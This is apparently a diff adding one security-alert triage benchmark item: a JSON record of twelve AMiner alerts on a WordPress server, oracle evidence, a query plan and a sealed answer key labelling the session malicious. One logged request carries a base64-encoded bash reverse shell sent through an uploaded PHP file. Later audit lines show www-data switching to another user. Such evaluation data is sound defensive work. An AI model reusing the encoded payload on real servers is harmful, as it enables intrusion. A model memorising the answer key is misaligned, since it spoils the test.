@@ -1,0 +1,356 @@
+{
+  "incident_id": "ait-sess-fox-fox-0077",
+  "name": "ATTEST-AIT fox/fox session 77",
+  "source_benchmark": "ATTEST-AIT-ADS",
+  "source_scenario": "fox/fox/session-0077",
+  "alert": {
+    "timestamp": "2022-01-18T12:59:54Z",
+    "host": "fox",
+    "user": "unknown",
+    "alert_type": "ait_ads_session",
+    "summary": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on fox (12 alerts; detectors: AMiner: CPU value deviates from average in monitoring logs., AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter comb",
+    "scenario": "fox"
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-18T12:59:54Z",
+    "end": "2022-01-18T13:20:27Z",
+    "hosts": [
+      "fox"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-sess-0001-a83feb4b",
+        "timestamp": "2022-01-18T12:59:54Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+        "message": "{\"@timestamp\":\"2022-01-18T12:59:54.321Z\",\"service\":{\"type\":\"system\"},\"tags\":[\"beats_input_raw_event\"],\"@version\":\"1\",\"agent\":{\"type\":\"metricbeat\",\"hostname\":\"intranet-server\",\"version\":\"7.13.2\",\"id\":\"a0c41e4e-ff4a-481f-adda-21fc96889b28\",\"name\":\"intranet-server\",\"ephemeral_id\":\"ae20c47b-0a81-4e05-a749-cbe0dacd5e36\"},\"system\":{\"cpu\":{\"softirq\":{\"pct\":4.0E-4,\"norm\":{\"pct\":4.0E-4}},\"iowait\":{\"pct\":0,",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0002-c612772c",
+        "timestamp": "2022-01-18T13:00:31Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: Unusual occurrence frequencies of DNS query IPs.",
+        "message": "Jan 18 13:00:31 dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from 192.168.128.4",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0003-2457cdbf",
+        "timestamp": "2022-01-18T13:13:28Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "172.17.130.196 - - [18/Jan/2022:13:13:28 +0000] \"GET / HTTP/1.1\" 200 6128 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0004-ae17b58c",
+        "timestamp": "2022-01-18T13:14:18Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.17.130.196 - - [18/Jan/2022:13:14:18 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506717 \"-\" \"python-requests/2.27.1\"",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0005-b0cf87b1",
+        "timestamp": "2022-01-18T13:14:31Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 18 13:14:31 intranet-server su[28816]: Successful su for phopkins by www-data",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0006-650072db",
+        "timestamp": "2022-01-18T13:14:31Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 18 13:14:31 intranet-server su[28816]: + /dev/pts/1 www-data:phopkins",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0007-bdaa03ca",
+        "timestamp": "2022-01-18T13:14:31Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 18 13:14:31 intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0008-676a75cb",
+        "timestamp": "2022-01-18T13:14:31Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: New user_auth parameter combination in Audit logs.",
+        "message": "type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"phopkins\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/1 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0009-5e558ceb",
+        "timestamp": "2022-01-18T13:14:31Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: New user_acct parameter combination in Audit logs.",
+        "message": "type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"phopkins\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/1 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0010-bae83299",
+        "timestamp": "2022-01-18T13:14:31Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: New cred_acq parameter combination in Audit logs.",
+        "message": "type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"phopkins\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/1 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0011-319d50c0",
+        "timestamp": "2022-01-18T13:14:32Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"phopkins\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/1 res=success'",
+        "sensor": "aminer"
+      },
+      {
+        "event_id": "ait-sess-0012-d7644525",
+        "timestamp": "2022-01-18T13:20:27Z",
+        "host": "fox",
+        "source": "alerts",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+        "message": "172.17.130.196 - - [18/Jan/2022:13:20:27 +0000] \"POST /wp-admin/admin-ajax.php HTTP/1.1\" 200 1175 \"https://intranet.price.fox.org/?p=5\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"",
+        "sensor": "aminer"
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-sess-0001-a83feb4b",
+      "source": "alerts",
+      "timestamp": "2022-01-18T12:59:54Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+        "message": "{\"@timestamp\":\"2022-01-18T12:59:54.321Z\",\"service\":{\"type\":\"system\"},\"tags\":[\"beats_input_raw_event\"],\"@version\":\"1\",\"agent\":{\"type\":\"metricbeat\",\"hostname\":\"intranet-server\",\"version\":\"7.13.2\",\"id\":\"a0c41e4e-ff4a-481f-adda-21fc96889b28\",\"name\":\"intranet-server\",\"ephemeral_id\":\"ae20c47b-0a81-4e05-a749-cbe0dacd5e36\"},\"system\":{\"cpu\":{\"softirq\":{\"pct\":4.0E-4,\"norm\":{\"pct\":4.0E-4}},\"iowait\":{\"pct\":0,",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0002-c612772c",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:00:31Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: Unusual occurrence frequencies of DNS query IPs.",
+        "message": "Jan 18 13:00:31 dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from 192.168.128.4",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0003-2457cdbf",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:13:28Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "172.17.130.196 - - [18/Jan/2022:13:13:28 +0000] \"GET / HTTP/1.1\" 200 6128 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0004-ae17b58c",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:14:18Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.17.130.196 - - [18/Jan/2022:13:14:18 +0000] \"GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506717 \"-\" \"python-requests/2.27.1\"",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0005-b0cf87b1",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:14:31Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 18 13:14:31 intranet-server su[28816]: Successful su for phopkins by www-data",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0006-650072db",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:14:31Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 18 13:14:31 intranet-server su[28816]: + /dev/pts/1 www-data:phopkins",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0007-bdaa03ca",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:14:31Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 18 13:14:31 intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0008-676a75cb",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:14:31Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: New user_auth parameter combination in Audit logs.",
+        "message": "type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"phopkins\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/1 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0009-5e558ceb",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:14:31Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: New user_acct parameter combination in Audit logs.",
+        "message": "type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"phopkins\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/1 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0010-bae83299",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:14:31Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: New cred_acq parameter combination in Audit logs.",
+        "message": "type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"phopkins\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/1 res=success'",
+        "sensor": "aminer"
+      }
+    },
+    {
+      "event_id": "ait-sess-0011-319d50c0",
+      "source": "alerts",
+      "timestamp": "2022-01-18T13:14:32Z",
+      "host": "fox",
+      "fields": {
+        "detector": "AMiner: New user_start parameter combination in Audit logs.",
+        "message": "type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=\"phopkins\" exe=\"/bin/su\" hostname=? addr=? terminal=/dev/pts/1 res=success'",
+        "sensor": "aminer"
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "fox"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "fox"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on fox (12 alerts; detectors: AMiner: CPU value deviates from average in monitoring logs., AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter comb",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "fox"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "fox"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "Decide malicious vs benign for ATTEST-style AIT-ADS alert session on fox (12 alerts; detectors: AMiner: CPU value deviates from average in monitoring logs., AMiner: High entropy in Apache Access request., AMiner: New cred_acq parameter comb",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "ATTEST-AIT-ADS",
+    "scenario": "fox/fox/session-0077",
+    "answer": "malicious",
+    "accept": [
+      "malicious"
+    ],
+    "grading": "exact_ci",
+    "label": "malicious",
+    "is_true_positive": true,
+    "attack_stages": [
+      "cracking",
+      "privilege_escalation",
+      "reverse_shell"
+    ],
+    "session": {
+      "gap_sec": 900,
+      "max_sec": 3600,
+      "alert_count": 12,
+      "kept_alerts": 12
+    },
+    "sealed": true
+  }
+}
